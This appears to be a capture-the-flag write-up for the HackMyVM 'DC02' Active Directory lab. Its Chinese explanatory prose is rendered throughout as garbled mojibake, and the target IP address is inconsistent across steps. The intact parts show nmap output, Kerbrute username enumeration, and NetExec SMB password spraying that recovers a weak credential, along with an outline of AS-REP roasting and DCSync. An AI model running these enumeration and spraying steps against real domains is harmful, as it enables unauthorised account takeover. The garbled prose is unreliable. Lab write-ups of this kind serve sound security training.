---
title: HMV-DC02
description: 'Second DC from me. Enjoy it.'
pubDate: 2025-08-20
image: /machine/DC02.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Windows Machine
---

å¼€å±€æŠ¥é”™ï¼Œä¿®æ”¹åå­—å³å¯

![](/image/hmvmachines/DC02-1.png)![](/image/hmvmachines/DC02-2.png)

# æ€ç»´å¯¼å›¾
ä¿¡æ¯æ”¶é›†ä¸åŸŸæ¸—é€æµç¨‹

â”‚

â”œâ”€â”€ 1. ä¸»æœºå‘ç° & åŸºç¡€ä¿¡æ¯æ”¶é›†

â”‚   â”œâ”€â”€ 1.1 ARP æ‰«æ

â”‚   â”‚   â”œâ”€â”€ å·¥å…·ï¼šarp-scan

â”‚   â”‚   â”œâ”€â”€ ä½œç”¨ï¼šå‘ç°æœ¬åœ°ç½‘æ®µå­˜æ´»ä¸»æœº

â”‚   â”‚   â””â”€â”€ ç¤ºä¾‹ï¼šarp-scan -l | grep "08:00:27"

â”‚   â”‚

â”‚   â”œâ”€â”€ 1.2 Nmap æ‰«æ

â”‚   â”‚   â”œâ”€â”€ ä½¿ç”¨å‚æ•°ï¼š

â”‚   â”‚   â”‚   â”œâ”€â”€ -Pnï¼ˆè·³è¿‡ä¸»æœºå‘ç°ï¼‰

â”‚   â”‚   â”‚   â”œâ”€â”€ -sTï¼ˆä¸‰æ¬¡æ¡æ‰‹ TCP æ‰«æï¼‰

â”‚   â”‚   â”‚   â”œâ”€â”€ -sCï¼ˆé»˜è®¤è„šæœ¬ï¼‰

â”‚   â”‚   â”‚   â”œâ”€â”€ -sVï¼ˆæœåŠ¡ç‰ˆæœ¬æ¢æµ‹ï¼‰

â”‚   â”‚   â”‚   â””â”€â”€ -T4ï¼ˆåŠ é€Ÿæ‰«æï¼‰

â”‚   â”‚   â”œâ”€â”€ ä¸»è¦è¾“å‡ºå†…å®¹ï¼š

â”‚   â”‚   â”‚   â”œâ”€â”€ Kerberosï¼ˆ88ï¼‰

â”‚   â”‚   â”‚   â”œâ”€â”€ LDAPï¼ˆ389/636/3268/3269ï¼‰

â”‚   â”‚   â”‚   â”œâ”€â”€ SMBï¼ˆ445ï¼‰

â”‚   â”‚   â”‚   â””â”€â”€ RPCï¼ˆ135ï¼‰

â”‚   â”‚   â””â”€â”€ ç»“æœç”¨é€”ï¼šåˆ¤æ–­åŸŸæ§ã€åˆ¤æ–­å¯ç”¨æ”»å‡»é¢

â”‚

â”œâ”€â”€ 2. åŸŸä¾¦å¯Ÿï¼šåŒ¿å SMBã€Kerberos ç”¨æˆ·æšä¸¾

â”‚   â”œâ”€â”€ 2.1 SMB åŒ¿åè¿æ¥æµ‹è¯•

â”‚   â”‚   â”œâ”€â”€ å·¥å…·ï¼šsmbclient

â”‚   â”‚   â”œâ”€â”€ ç›®çš„ï¼šåˆ¤æ–­æ˜¯å¦èƒ½åŒ¿åæšä¸¾å…±äº«

â”‚   â”‚   â””â”€â”€ ç»“æœï¼šå¤±è´¥ â†’ ä¸èƒ½åŒ¿å

â”‚   â”‚

â”‚   â”œâ”€â”€ 2.2 Kerberos ç”¨æˆ·åæšä¸¾ï¼ˆKerbruteï¼‰

â”‚   â”‚   â”œâ”€â”€ åŸç†ï¼š

â”‚   â”‚   â”‚   â”œâ”€â”€ é€šè¿‡ AS-REQ é”™è¯¯ç åˆ¤æ–­ç”¨æˆ·åå­˜åœ¨æ€§

â”‚   â”‚   â”‚   â””â”€â”€ æ— éœ€ä»»ä½•å‡­æ®

â”‚   â”‚   â”œâ”€â”€ å·¥å…·ï¼šKerbrute

â”‚   â”‚   â”œâ”€â”€ å‘½ä»¤ï¼š

â”‚   â”‚   â”‚   ./kerbrute userenum -d DOMAIN --dc IP user.txt

â”‚   â”‚   â””â”€â”€ è¾“å‡ºï¼šå‘ç°æœ‰æ•ˆç”¨æˆ·ï¼ˆadmin, Administrator, charlieâ€¦ï¼‰

â”‚   â”‚

â”‚   â””â”€â”€ 2.3 æ¸…æ´—ç”¨æˆ·åˆ—è¡¨

â”‚       â”œâ”€â”€ sed å»é¢œè‰²

â”‚       â”œâ”€â”€ awk å»åŸŸå

â”‚       â””â”€â”€ ç”Ÿæˆå¹²å‡€ user.txt

â”‚

â”œâ”€â”€ 3. SMB å¯†ç å–·æ´’ï¼ˆæœ€ç¨³å®šçš„è®¤è¯åè®®ï¼‰

â”‚   â”œâ”€â”€ 3.1 ä¸ºä»€ä¹ˆ SMB æ˜¯ç¬¬ä¸€é€‰æ‹©

â”‚   â”‚   â”œâ”€â”€ é»˜è®¤å¼€å¯

â”‚   â”‚   â”œâ”€â”€ æ”¯æŒ NTLM / PTH / Kerberos

â”‚   â”‚   â”œâ”€â”€ è®¤è¯è¿”å›ç å‡†ç¡®

â”‚   â”‚   â””â”€â”€ æˆåŠŸåèƒ½æ‰§è¡Œå‘½ä»¤

â”‚   â”‚

â”‚   â”œâ”€â”€ 3.2 ä½¿ç”¨ NetExec / CrackMapExec

â”‚   â”‚   â”œâ”€â”€ å‘½ä»¤ç¤ºä¾‹ï¼š

â”‚   â”‚   â”‚   â””â”€â”€ nxc smb DC -u user.txt -p user.txt --continue-on-success

â”‚   â”‚   â”œâ”€â”€ --continue-on-successï¼šæˆåŠŸåç»§ç»­æµ‹è¯•

â”‚   â”‚   â”œâ”€â”€ --no-bruteforceï¼šåªæµ‹è¯• username=password

â”‚   â”‚   â””â”€â”€ ç»“æœï¼šå‘ç° charlie:charlie

â”‚

â”œâ”€â”€ 4. æ¸—é€æ ‡å‡†åŸŸç”¨æˆ·ï¼ˆcharlieï¼‰

â”‚   â”œâ”€â”€ 4.1 SMB ç™»å½•æµ‹è¯•

â”‚   â”‚   â”œâ”€â”€ å·¥å…·ï¼šnxc / smbclient

â”‚   â”‚   â””â”€â”€ ç»“æœï¼šç™»å½•æˆåŠŸï¼Œä½†æƒé™ä½

â”‚   â”‚

â”‚   â”œâ”€â”€ 4.2 SMB æšä¸¾å…±äº«

â”‚   â”‚   â””â”€â”€ æ— æ³•è®¿é—®æ•æ„Ÿå…±äº«ï¼ˆåªè¯»ï¼‰

â”‚   â”‚

â”‚   â”œâ”€â”€ 4.3 RID çˆ†ç ´ï¼ˆæšä¸¾æ›´å¤šåŸŸç”¨æˆ·ï¼‰

â”‚       â”œâ”€â”€ å·¥å…·ï¼šNetExec

â”‚       â”œâ”€â”€ ç›®çš„ï¼šè·å–æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨

â”‚       â””â”€â”€ ç»“æœï¼šç”Ÿæˆæ›´å¤§çš„ user åˆ—è¡¨

â”‚

â”œâ”€â”€ 5. AS-REP Roastingï¼ˆæ— é¡»å¯†ç ï¼‰

â”‚   â”œâ”€â”€ 5.1 åŸç†

â”‚   â”‚   â”œâ”€â”€ â€œä¸éœ€è¦é¢„è®¤è¯â€ ç”¨æˆ·å¯ç›´æ¥è·å¾— AS-REP å¯†æ–‡

â”‚   â”‚   â”œâ”€â”€ å¯ç¦»çº¿ç ´è§£

â”‚   â”‚   â”œâ”€â”€ æ— é™åˆ¶ã€ä¸è§¦å‘é”å®š

â”‚   â”‚   â””â”€â”€ å±äºé«˜å±é…ç½®

â”‚   â”‚

â”‚   â”œâ”€â”€ 5.2 å·¥å…·ï¼šGetNPUsersï¼ˆImpacketï¼‰

â”‚   â”‚   â”œâ”€â”€ å‘½ä»¤ï¼š

â”‚   â”‚   â”‚   impacket-GetNPUsers -usersfile user -dc-ip IP DOMAIN/user:pass

â”‚   â”‚   â””â”€â”€ ç»“æœï¼šè·å¾— zximena448 çš„ AS-REP

â”‚   â”‚

â”‚   â”œâ”€â”€ 5.3 å“ˆå¸Œç ´è§£

â”‚   â”‚   â”œâ”€â”€ å·¥å…·ï¼šjohn / hashcat

â”‚   â”‚   â””â”€â”€ ç»“æœï¼šå¯†ç  = internet

â”‚

â”œâ”€â”€ 6. æƒé™æå‡è‡³é«˜çº§ç”¨æˆ·ï¼ˆzximena448ï¼‰

â”‚   â”œâ”€â”€ 6.1 SMB è®¤è¯æµ‹è¯•

â”‚   â”‚   â””â”€â”€ æˆåŠŸï¼Œä¸”è®¿é—®æƒé™æå‡

â”‚   â”‚

â”‚   â”œâ”€â”€ 6.2 å…±äº«æšä¸¾

â”‚   â”‚   â”œâ”€â”€ è®¿é—® ADMIN$

â”‚   â”‚   â”œâ”€â”€ è®¿é—® C$

â”‚   â”‚   â””â”€â”€ è·å¾—æ›´å¤šæ•æ„Ÿç›®å½•

â”‚   â”‚

â”‚   â””â”€â”€ 6.3 è¯»å–æ¡Œé¢æ–‡ä»¶

â”‚       â”œâ”€â”€ å·¥å…·ï¼šsmbclient

â”‚       â”œâ”€â”€ æ“ä½œï¼šcd /Users/xxx/Desktop

â”‚       â””â”€â”€ è·å– user.txt / flag

â”‚

â””â”€â”€ 7. ä¸‹ä¸€æ­¥è¡ŒåŠ¨ï¼ˆå¯é€‰ï¼‰

    â”œâ”€â”€ DCSync

    â”œâ”€â”€ Pass-the-Hash

    â”œâ”€â”€ Pass-the-Ticket

    â”œâ”€â”€ è·å– SYSTEM æƒé™

    â””â”€â”€ æ¨ªå‘ç§»åŠ¨





# ä¿¡æ¯æ”¶é›†
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# arp-scan -l | grep "08:00:27" | awk '{print $1}'
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
172.16.55.13
```

## nampæŒ‡ä»¤
### -Pnï¼ˆè·³è¿‡ä¸»æœºå‘ç°ï¼‰
### -sTCVï¼ˆç»„åˆæ‰«æç±»å‹ï¼‰
#### -sTï¼ˆTCPè¿æ¥æ‰«æï¼‰
+ ä½¿ç”¨å®Œæ•´çš„TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥
+ ä¼˜ç‚¹ï¼šæœ€ç¨³å®šå¯é ï¼Œä¸ä¼šè¢«é˜²ç«å¢™è½»æ˜“é˜»æ­¢
+ ç¼ºç‚¹ï¼šé€Ÿåº¦è¾ƒæ…¢ï¼Œä¼šåœ¨ç›®æ ‡æ—¥å¿—ä¸­ç•™ä¸‹è®°å½•
+ å·¥ä½œåŸç†ï¼šå°è¯•ä¸æ¯ä¸ªç«¯å£å»ºç«‹å®Œæ•´è¿æ¥

#### -sCï¼ˆè„šæœ¬æ‰«æï¼‰
+ ä½¿ç”¨nmapçš„é»˜è®¤è„šæœ¬é›†è¿›è¡Œæ›´æ·±å…¥çš„æ¢æµ‹
+ è„šæœ¬å¯ä»¥æ£€æµ‹ï¼šæœåŠ¡ç‰ˆæœ¬ã€æ¼æ´ã€é…ç½®ä¿¡æ¯ç­‰
+ ç›¸å½“äº `--script=default`

#### -sVï¼ˆç‰ˆæœ¬æ£€æµ‹ï¼‰
+ æ¢æµ‹å¼€æ”¾ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡åŠå…¶ç‰ˆæœ¬å·
+ é€šè¿‡å‘é€ç‰¹å®šæ¢æµ‹åŒ…å¹¶åˆ†æå“åº”æ¥è¯†åˆ«æœåŠ¡

###  -T4ï¼ˆæ—¶é—´æ¨¡æ¿ï¼‰
+ å®šä¹‰ï¼šè®¾ç½®æ‰«æçš„æ—¶é—´ç­–ç•¥/é€Ÿåº¦
+ çº§åˆ«èŒƒå›´ï¼šT0-T5ï¼ˆT0æœ€æ…¢ï¼ŒT5æœ€å¿«ï¼‰
+ T4ç‰¹ç‚¹ï¼š
    - æ¿€è¿›æ¨¡å¼ï¼ˆAggressiveï¼‰
    - æ¯”é»˜è®¤é€Ÿåº¦æ›´å¿«
    - å¢åŠ å¸¦å®½ä½¿ç”¨å’Œç½‘ç»œè´Ÿè½½
    - å¯èƒ½åœ¨ç½‘ç»œä¸­äº§ç”Ÿæ›´å¤š"å™ªéŸ³"

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -Pn -sTCV -T4 172.16.55.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-07 03:32 EST
Nmap scan report for 172.16.55.130
Host is up (0.00054s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-07 23:32:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 14h59m57s
| smb2-time: 
|   date: 2025-12-07T23:32:37
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:de:3d:5b (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.15 second
```

+ **88/tcp** â†’ Kerberosï¼ˆåŸŸèº«ä»½è®¤è¯ï¼‰(å¯ä»¥åˆ©ç”¨SPNè·å–TGS hash)
+ **389/tcp / 636/tcp / 3268 / 3269** â†’ LDAP / LDAPS / å…¨å±€ç¼–å½•
+ **135 / 139 / 445** â†’ RPC / SMBï¼ˆæ–‡ä»¶å…±äº«ã€è¿œç¨‹è°ƒç”¨ï¼‰
+ **464** â†’ kpasswdï¼ˆKerberos æ”¹å¯†ï¼‰
+ Hostname: **DC01**ï¼ŒDomain: **SOUPEDECODE.LOCAL**

æ ¹æ®nmapè¿›è¡Œæ·»åŠ hosts

```c
172.16.55.130 SOUPEDECODE.LOCAL
```

# SMBåŒ¿åè¿æ¥
ç”±äºå¼€æ”¾445ç«¯å£æ‰€ä»¥å°è¯•è¿›è¡ŒsmbåŒ¿åè¿æ¥

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# smbclient -L 172.16.55.130 -N

session setup failed: NT_STATUS_ACCESS_DENIED                                        
```

å¯ä»¥å‘ç°æ— æ³•è¿›è¡ŒåŒ¿åè¿æ¥

#  æ— å‡­æ®æƒ…å†µä¸‹æšä¸¾åŸŸç”¨æˆ·  
## å‰ç½®çŸ¥è¯†
### 1ï¸âƒ£ èƒŒæ™¯ï¼šKerberos åœ¨ Windows åŸŸé‡Œçš„ä½œç”¨
+ Windows åŸŸæ§ (DC) ä½¿ç”¨ **Kerberos åè®®** æ¥è®¤è¯ç”¨æˆ·ã€‚
+ Kerberos æµç¨‹å¤§è‡´ï¼š
    1. å®¢æˆ·ç«¯è¯·æ±‚ **TGT (Ticket Granting Ticket)**ï¼Œå‘é€ç”¨æˆ·åç»™ KDCï¼ˆKey Distribution Centerï¼ŒåŸŸæ§ï¼‰ã€‚
    2. KDC æ£€æŸ¥ç”¨æˆ·åï¼š
        * ç”¨æˆ·å­˜åœ¨ â†’ è¿”å› **éœ€è¦é¢„è®¤è¯ï¼ˆPre-authentication requiredï¼‰**
        * ç”¨æˆ·ä¸å­˜åœ¨ â†’ è¿”å› **Principal unknown é”™è¯¯**

æ³¨æ„ï¼šæ­¤é˜¶æ®µæ— éœ€æä¾›å¯†ç å³å¯åˆ¤æ–­ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ã€‚

---

### 2ï¸âƒ£ Kerbrute çš„å·¥ä½œåŸç†
`kerbrute userenum` ä¸»è¦åˆ©ç”¨äº† **TGT è¯·æ±‚çš„å“åº”å·®å¼‚**ï¼š

1. å‘ç›®æ ‡ DC çš„ **Kerberos æœåŠ¡ (TCP 88)** å‘é€ **AS-REQï¼ˆAuthentication Service Requestï¼‰** è¯·æ±‚
    - è¯·æ±‚é‡ŒåªåŒ…å«ç”¨æˆ·åï¼Œä¸éœ€è¦å¯†ç 
2. DC è¿”å›ä¸åŒçš„é”™è¯¯ç ï¼š

| è¿”å›ä¿¡æ¯ | å«ä¹‰ |
| --- | --- |
| KRB5KDC_ERR_PREAUTH_REQUIRED | ç”¨æˆ·å­˜åœ¨ï¼ˆä½†éœ€è¦å¯†ç æ‰èƒ½ç»§ç»­ï¼‰ |
| KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN | ç”¨æˆ·ä¸å­˜åœ¨ |


3. Kerbrute æ ¹æ®è¿”å›ç åˆ¤æ–­å“ªäº›ç”¨æˆ·åæœ‰æ•ˆï¼Œå¹¶æŠŠç»“æœè¾“å‡º

---

### 3ï¸âƒ£ ä¸ºä»€ä¹ˆ SMB / LDAP ä¸è¡Œæ—¶ä»å¯ç”¨
+ SMB / LDAP åŒ¿åè®¿é—®è¢«ç¦ â†’ æ— æ³•ç›´æ¥æšä¸¾ç”¨æˆ·æˆ–å…±äº«
+ Kerberos æšä¸¾ä¸ä¾èµ–åŒ¿åè®¿é—®æƒé™ï¼Œå®ƒåªä¾èµ– **KDC å¯¹ç”¨æˆ·åå­˜åœ¨ä¸å¦çš„å“åº”å·®å¼‚**
+ æ‰€ä»¥å³ä½¿æ²¡æœ‰å‡­æ®ï¼Œä¹Ÿèƒ½æ”¶é›†åŸŸå†…ç”¨æˆ·å

---

### 4ï¸âƒ£ å¯è§†åŒ–æ¯”å–»
+ DC å°±åƒä¸€ä¸ª **å‰å°æ¥å¾…**ï¼š
    - SMB / LDAP åŒ¿åè®¿é—®ï¼šå‰å°è¦æ±‚å‡ºç¤ºå·¥å¡ï¼Œå¦åˆ™ä¸ç»™çœ‹å…¬å¸ç›®å½•
    - Kerberos TGT è¯·æ±‚ï¼šä½ æŠ¥ä¸€ä¸ªåå­—ï¼Œå‰å°ä¼šå‘Šè¯‰ä½ è¿™ä¸ªåå­—æ˜¯å¦åœ¨å‘˜å·¥åå•ä¸Šï¼Œä½†ä¸éœ€è¦å¯†ç 

---

âœ… **æ€»ç»“**

+ Kerbrute æšä¸¾ç”¨æˆ·åçš„æ ¸å¿ƒåŸç†ï¼š**åˆ©ç”¨ Kerberos å¯¹å­˜åœ¨/ä¸å­˜åœ¨ç”¨æˆ·åè¿”å›ä¸åŒé”™è¯¯ç **
+ ä¸éœ€è¦å‡­æ®ã€ä¸å—åŒ¿åè®¿é—®é™åˆ¶ï¼Œæ˜¯ **åŸŸç”¨æˆ·æ”¶é›†çš„æ ‡å‡†æ‰‹æ®µ**

## kerbruteæšä¸¾
å·¥å…·ï¼š[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/kerbrute]
â””â”€# ./kerbrute userenum -d SOUPEDECODE.LOCAL --dc 172.16.55.130 /home/kali/Desktop/wordlists/self/user.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/07/25 - Ronnie Flathers @ropnop

2025/12/07 03:48:53 >  Using KDC(s):
2025/12/07 03:48:53 >   172.16.55.130:88

2025/12/07 03:48:53 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2025/12/07 03:48:53 >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2025/12/07 03:48:53 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2025/12/07 03:48:53 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2025/12/07 03:48:54 >  Done! Tested 8886 usernames (4 valid) in 0.813 seconds
```

```c
./kerbrute userenum -d SOUPEDECODE.LOCAL --dc 172.16.55.130 /home/kali/Desktop/wordlists/self/user.txt 2>&1 \
| sed -n 's/\x1b\[[0-9;]*m//g; /VALID USERNAME/ {s/.*VALID USERNAME: *//; s/@.*//; s/^[ \t]*//; s/[ \t\r]*$//; p}' > user.txt
```

```c
with open('user.txt','r') as f:
    lines = f.readlines()

with open('user.txt','w') as f:
    for line in lines:
        line = line.strip()
        if '@' in line:
            username = line.split('@')[0].split()[-1]  # å–æœ€åä¸€ä¸ªç©ºæ ¼åçš„éƒ¨åˆ†
            f.write(username + '\n')
```



### âœ… ä¸ºä»€ä¹ˆ Kerbrute æšä¸¾å®Œç”¨æˆ·ä¹‹åï¼Œä¸‹ä¸€æ­¥è¦ç”¨ SMBï¼Ÿ
å› ä¸º **SMB æ˜¯ Active Directoryï¼ˆADï¼‰ç¯å¢ƒä¸­æœ€é€šç”¨ã€æœ€å¯é ã€æœ€å¸¸è§ã€æœ€å®¹æ˜“åˆ©ç”¨çš„åè®®**ï¼Œå¹¶ä¸”ï¼š

#### â­ åœ¨ç»å¤§å¤šæ•° AD æ¸—é€ä¸­ï¼ŒSMB æ˜¯â€œç¬¬ä¸€é€‰æ‹©çš„è®¤è¯åè®®â€ã€‚
ä¸‹é¢æˆ‘å‘Šè¯‰ä½ ä¸ºä»€ä¹ˆã€‚

---

##### ğŸŸ¦ 1. SMB è®¤è¯æ˜¯æ‰€æœ‰ Windows åŸŸä¸»æœºéƒ½é»˜è®¤å¯ç”¨çš„
åªè¦ç›®æ ‡åœ¨åŸŸé‡Œï¼Œå°±ä¼šè‡ªåŠ¨å¼€å¯ 445 ç«¯å£ï¼ˆSMBï¼‰ã€‚

è¿™æ„å‘³ç€ï¼š

+ åŸŸæ§æœ‰ SMB
+ æ‰€æœ‰åŸŸå†… Windows æœåŠ¡å™¨æœ‰ SMB
+ æ‰€æœ‰åŸŸå†… Windows å·¥ä½œç«™æœ‰ SMB

ğŸ‘‰ **è¿™æ˜¯åŸŸå†…æœ€ç¨³å®šã€æœ€è‚¯å®šèƒ½ç¢°åˆ°çš„è®¤è¯å…¥å£ã€‚**

---

##### ğŸŸ¦ 2. SMB æ”¯æŒ NTLM â€”â€” ä½ èƒ½ç”¨å¯†ç ã€hashã€ticket éƒ½èƒ½ç™»å½•
SMB æ”¯æŒçš„è®¤è¯æ–¹å¼æœ€å…¨ï¼š

| ç±»å‹ | SMB | WinRM | LDAP | SSH |
| --- | --- | --- | --- | --- |
| æ˜æ–‡å¯†ç  | âœ”ï¸ | âœ”ï¸ | âœ”ï¸ | âœ”ï¸ |
| NTLM hash | âœ”ï¸ | âœ”ï¸ï¼ˆå—é™ï¼‰ | âŒ | âŒ |
| Pass-the-Hash | âœ”ï¸ï¼ˆå®Œå…¨æ”¯æŒï¼‰ | âœ”ï¸ï¼ˆéƒ¨åˆ†ï¼‰ | âŒ | âŒ |
| Kerberos ticket (Pass-the-Ticket) | âœ”ï¸ | âœ”ï¸ | âŒ | âŒ |


æ‰€ä»¥ï¼š

**åªè¦ä½ æœ‰å¯†ç æˆ– hashï¼ŒSMB æ˜¯æœ€å¥½ç”¨çš„ç™»å½•åè®®ã€‚**

---

##### ğŸŸ¦ 3. SMB ç™»å½•æˆåŠŸå â†’ å¯ä»¥ç›´æ¥åšæ¨ªå‘ç§»åŠ¨ï¼ˆæœ€å¤§ä»·å€¼ï¼šæ‰§è¡Œå‘½ä»¤ï¼‰
ä¸€æ—¦ SMB ç™»å½•æˆåŠŸï¼š

```plain
nxc smb <target> -u user -p pass -x "whoami"
```

å¯ä»¥ç›´æ¥åœ¨ç›®æ ‡æ‰§è¡Œå‘½ä»¤ï¼Œå¾ˆé€‚åˆä¸Šçº¿ç›®æ ‡æœºå™¨ã€‚

---

##### ğŸŸ¦ 4. SMB é”™è¯¯ç éå¸¸å‡†ç¡® â†’ æœ€å®¹æ˜“åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®
ä¾‹å¦‚ï¼š

+ å¯†ç æ­£ç¡® â†’ æ˜ç¡®è¿”å›æˆåŠŸ
+ å¯†ç é”™è¯¯ â†’ è¿”å› STATUS_LOGON_FAILURE
+ è´¦æˆ·é”å®š â†’ è¿”å› STATUS_ACCOUNT_LOCKED_OUT
+ ç”¨æˆ·å­˜åœ¨ä½†å¯†ç ä¸å¯¹ â†’ æ˜ç¡®åŒºåˆ†

ğŸ” æ‰€ä»¥ï¼š**å¯†ç å–·æ´’ã€çˆ†ç ´éƒ½ä»¥ SMB æœ€ç²¾ç¡®ã€æœ€ç¨³ã€‚**

---

##### ğŸŸ¦ 5. å…¶ä»–åè®®ä¸é€‚åˆä½œä¸ºâ€œç¬¬ä¸€æ­¥æ”»å‡»é¢â€
ä½ å¯èƒ½ä¼šé—®ï¼š

ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨ WinRMã€LDAPã€Kerberosï¼Ÿ

å› ä¸ºï¼š

###### âŒ WinRM
+ é»˜è®¤ä¸å¼€
+ æœåŠ¡å™¨ç«¯å£5985/5986å¯èƒ½è¢«å…³é—­
+ è¦æ±‚ç”¨æˆ·å¿…é¡»å±äº **Remote Management Users**

###### âŒ LDAP
+ å¤šæ•°åŸŸæ§å¯ç”¨
+ ä½†æ™®é€šç”¨æˆ·èƒ½åšçš„äº‹æƒ…æœ‰é™ï¼ˆæŸ¥ä¿¡æ¯ï¼Œä¸æ‰§è¡Œå‘½ä»¤ï¼‰

###### âŒ Kerberos
+ å¯¹å¯†ç åˆ¤æ–­æ²¡ SMB ç²¾å‡†
+ ä¸æ”¯æŒæ‰§è¡Œå‘½ä»¤æˆ–æ¨ªå‘ç§»åŠ¨

###### âŒ SSH / FTP / RDP
+ å¾ˆå¤šä¸»æœºæ ¹æœ¬æ²¡æœ‰è¿™äº›åè®®
+ åœ¨ AD ç¯å¢ƒä¸ç¨³å®š

å› æ­¤ï¼š

ğŸ‘‰ **SMB æ˜¯æ”»å‡»é¢æœ€å¹¿ã€æœ€ç¨³å®šã€æˆåŠŸç‡æœ€é«˜çš„åè®®**



```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/kerbrute]
â””â”€# netexec smb SOUPEDECODE.LOCAL -u user.txt -p user.txt --continue-on-success 
SMB         10.0.90.222     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)                                                                                                                                                         
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\ADMIN:admin STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:admin STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\charlie:admin STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\admin:ADMIN STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\ADMIN:ADMIN STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:ADMIN STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\charlie:ADMIN STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\admin:Administrator STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\ADMIN:Administrator STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\charlie:Administrator STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\admin:charlie STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\ADMIN:charlie STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:charlie STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
```

 

é»˜è®¤æƒ…å†µä¸‹ï¼ŒNetExec åœ¨æŸä¸ªè´¦å·å¯†ç ç»„åˆ **ç™»å½•æˆåŠŸåä¼šåœæ­¢è¯¥ç”¨æˆ·çš„è¿›ä¸€æ­¥å°è¯•**ã€‚  

 ä½†åŠ ä¸Šï¼š  --continue-on-success   

 å°±ç®—å¯†ç å°è¯•æˆåŠŸä¹Ÿç»§ç»­ç”¨è¯¥ç”¨æˆ·å°è¯•å¯†ç æœ¬é‡Œçš„å…¶ä»–å¯†ç 



 --no-bruteforce   **é¿å…äº§ç”Ÿæš´åŠ›ç ´è§£è¡Œä¸º**ã€‚  

å¦‚æœæœ‰ä»¥ä¸‹åœºæ™¯ï¼š

`-u user.txt -p user.txt`

username å’Œ password åˆ—è¡¨ç›¸åŒ  
ä¼šäº§ç”Ÿå¾ˆå¤šï¼ˆæ¯ä¸ªç”¨æˆ· Ã— æ¯ä¸ªå¯†ç ï¼‰çš„ç»„åˆ

æ¯”å¦‚ user.txt é‡Œæœ‰ 100 è¡Œ  
å°†äº§ç”Ÿ 100 Ã— 100 = **10000 æ¬¡å°è¯•** â†’ è¿™å°±å˜æˆ **æš´åŠ›ç ´è§£** äº†ã€‚

